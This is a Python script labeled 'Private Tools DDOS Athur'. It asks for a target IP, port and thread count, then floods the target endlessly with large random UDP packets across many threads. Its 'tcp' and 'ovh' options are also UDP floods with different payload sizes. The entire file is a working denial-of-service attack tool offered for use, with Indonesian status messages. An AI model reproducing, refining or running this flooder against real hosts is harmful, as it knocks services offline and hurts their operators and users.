import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.035)

type("""Private Tools DDOS Athur. DONT SHARE IT""")
choice = str(input("$ Methods DDOS udp/tcp/ovh : "))
ip = str(input("ip : "))
port = int(input("port : "))
times = int(input("times : "))
threads = int(input("threads : "))

def udp():
	data = random._urandom(59000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Hayo lho Kekirim Packet Dari Athur ")
		except:
			print("ERROR Command")
			
def tcp():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Hayo lho Kekirim Packet Dari Athur ")
		except:
			print("ERROR Command")
			
def ovh():
	data = random._urandom(56000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Hayo lho Kekirim Packet Dari Athur ")
		except:
			print("ERROR Command")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()